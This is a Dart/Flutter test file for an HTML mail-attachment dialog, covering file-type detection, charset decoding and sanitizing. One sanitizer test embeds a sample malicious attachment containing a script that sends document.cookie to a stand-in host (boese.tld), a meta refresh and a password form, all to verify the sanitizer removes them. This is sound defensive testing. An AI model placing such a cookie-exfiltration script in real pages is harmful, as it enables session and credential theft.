import 'dart:convert';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:icd360sev_vorsitzer/services/mail_html_sanitizer.dart';
import 'package:icd360sev_vorsitzer/widgets/html_anhang_dialog.dart';

Uint8List b(List<int> v) => Uint8List.fromList(v);

void main() {
  group('istHtml', () {
    test('erkennt an der Endung', () {
      expect(HtmlAnhangDialog.istHtml('Rechnung.html'), isTrue);
      expect(HtmlAnhangDialog.istHtml('Rechnung.HTM'), isTrue);
      expect(HtmlAnhangDialog.istHtml('seite.xhtml'), isTrue);
    });

    test('erkennt am Content-Type, wenn die Endung fehlt', () {
      // Anhänge aus fremden Programmen kommen oft ohne Endung.
      expect(HtmlAnhangDialog.istHtml('dokument', 'text/html; charset=utf-8'), isTrue);
      expect(HtmlAnhangDialog.istHtml('teil', 'application/xhtml+xml'), isTrue);
    });

    test('greift nicht nach fremden Dateien', () {
      expect(HtmlAnhangDialog.istHtml('befund.pdf', 'application/pdf'), isFalse);
      expect(HtmlAnhangDialog.istHtml('bild.png', 'image/png'), isFalse);
      expect(HtmlAnhangDialog.istHtml('tabelle.xlsx'), isFalse);
      // ⚠️ „html" im Namen ist keine Endung.
      expect(HtmlAnhangDialog.istHtml('html_anleitung.pdf', 'application/pdf'), isFalse);
    });
  });

  group('htmlAnhangText', () {
    test('UTF-8 ohne jede Angabe', () {
      expect(htmlAnhangText(b(utf8.encode('<p>Grüße, Straße</p>'))),
          '<p>Grüße, Straße</p>');
    });

    test('UTF-8 mit BOM — die BOM selbst bleibt nicht im Text', () {
      final bytes = b([0xEF, 0xBB, 0xBF, ...utf8.encode('<p>Öl</p>')]);
      expect(htmlAnhangText(bytes), '<p>Öl</p>');
    });

    test('Latin-1 ohne Angabe fällt nicht auf Ersatzzeichen zurück', () {
      // 0xFC ist in UTF-8 ungültig -> strenger Versuch scheitert -> cp1252.
      expect(htmlAnhangText(b([0x47, 0x72, 0xFC, 0xDF, 0x65])), 'Grüße');
    });

    test('Windows-1252 rettet die typografischen Zeichen', () {
      // 0x93/0x94 sind Anführungszeichen, 0x80 das Eurozeichen. Als reines
      // Latin-1 wären das Steuerzeichen, die der Sanitizer entfernt.
      expect(htmlAnhangText(b([0x93, 0x41, 0x94, 0x20, 0x80])), '“A” €');
    });

    test('Content-Type des Servers schlägt das Raten', () {
      expect(htmlAnhangText(b([0xE4]), 'text/html; charset=iso-8859-1'), 'ä');
    });

    test('meta charset im Dokument wird gelesen', () {
      final doc = [
        ...latin1.encode('<html><head><meta charset="windows-1252"></head><body>'),
        0x96,
        ...latin1.encode('</body></html>'),
      ];
      expect(htmlAnhangText(b(doc)), contains('–'));
    });

    test('UTF-16 mit BOM, beide Richtungen', () {
      expect(htmlAnhangText(b([0xFF, 0xFE, 0x41, 0x00, 0x42, 0x00])), 'AB');
      expect(htmlAnhangText(b([0xFE, 0xFF, 0x00, 0x41, 0x00, 0x42])), 'AB');
    });

    test('leere Datei ergibt leeren Text, keinen Absturz', () {
      expect(htmlAnhangText(b([])), '');
    });
  });

  group('der Anhang läuft durch dieselbe Kette wie der Nachrichtentext', () {
    test('Skript, Formular und meta refresh überleben nicht', () {
      final quelle = htmlAnhangText(b(utf8.encode(
          '<html><head><meta http-equiv="refresh" content="0;url=http://boese.tld">'
          '</head><body><h1>Ihre Rechnung</h1>'
          '<script>fetch("http://boese.tld?c="+document.cookie)</script>'
          '<form action="http://boese.tld"><input name="pw"><button>Senden</button></form>'
          '</body></html>')));
      final sauber = sanitizeMailHtml(quelle);
      expect(sauber.html, contains('Ihre Rechnung'));
      expect(sauber.html.toLowerCase(), isNot(contains('<script')));
      expect(sauber.html.toLowerCase(), isNot(contains('<form')));
      expect(sauber.html.toLowerCase(), isNot(contains('http-equiv')));
      expect(sauber.html.toLowerCase(), isNot(contains('boese.tld')));
    });

    test('externe Bilder sind blockiert, nicht eingebettet', () {
      final sauber = sanitizeMailHtml(htmlAnhangText(
          b(utf8.encode('<img src="https://zaehler.tld/pixel.gif" alt="x">'))));
      expect(sauber.blockedImageCount, 1);
      expect(sauber.html, isNot(contains('zaehler.tld')));
    });
  });

  group('Dialog', _widgetTests);
}

/// ⚠️ Der Analyzer sieht keinen Überlauf und kein fehlendes Icon. Diese drei
/// Fälle bauen den Dialog wirklich auf; ein Layoutfehler wirft im Test.
void _widgetTests() {
  Future<void> zeige(WidgetTester t, List<int> bytes, String name) async {
    await t.pumpWidget(MaterialApp(
      home: Scaffold(
        body: HtmlAnhangDialog(bytes: Uint8List.fromList(bytes), fileName: name),
      ),
    ));
    await t.pump();
  }

  testWidgets('stellt den Anhang dar und nennt den Namen', (t) async {
    await zeige(t, utf8.encode('<h1>Ihre Rechnung</h1><p>Betrag: 12,50 €</p>'),
        'Rechnung.html');
    expect(find.text('Rechnung.html'), findsOneWidget);
    // fwfh baut RichText — ohne findRichText findet der Finder nichts.
    expect(find.textContaining('Ihre Rechnung', findRichText: true), findsWidgets);
    // Der Satz, der sagt, was gerade NICHT passiert.
    expect(find.textContaining('keine Skripte'), findsOneWidget);
  });

  testWidgets('Quelltext-Umschalter zeigt das Rohe', (t) async {
    await zeige(t, utf8.encode('<p>Hallo</p>'), 'a.html');
    await t.tap(find.byTooltip('Quelltext'));
    await t.pump();
    expect(find.textContaining('<p>Hallo</p>'), findsOneWidget);
  });

  testWidgets('reines Skript ergibt eine Erklärung, keine leere Fläche',
      (t) async {
    await zeige(t, utf8.encode('<script>alert(1)</script>'), 'leer.html');
    expect(find.textContaining('keinen darstellbaren Inhalt'), findsOneWidget);
    expect(find.text('Quelltext ansehen'), findsOneWidget);
  });
}
